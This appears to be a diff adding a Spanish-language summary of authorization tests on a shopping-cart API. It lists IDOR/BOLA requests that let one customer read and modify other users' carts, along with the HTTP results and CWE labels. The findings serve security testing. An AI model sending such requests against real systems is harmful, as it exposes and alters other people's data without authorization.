@@ -1,0 +1,16 @@
+=== IDOR / BOLA Summary ===
+
+1. IDOR Lectura - Carrito de otro usuario:
+   Atacante: cliente-a (sub=1, role=Cliente)
+   GET /api/cart/2 → HTTP 200 | userId=2 items=1 total=475000
+   GET /api/cart/3 → HTTP 200 | userId=3 items=0 total=0
+   → CWE-639: Authorization Bypass Through User-Controlled Key
+
+2. BOLA Escritura - Modificar carrito ajeno:
+   POST /api/cart/2/items {"productId":1,"quantity":5} → HTTP 201
+   → Carrito de userId=2 modificado por cliente-a (sub=1)
+   → CWE-284: Improper Access Control
+
+3. Admin endpoint test:
+   /api/admin/users con JWT role=Cliente → HTTP 403
+   → El endpoint admin SÍ existe y valida roles (parcialmente)
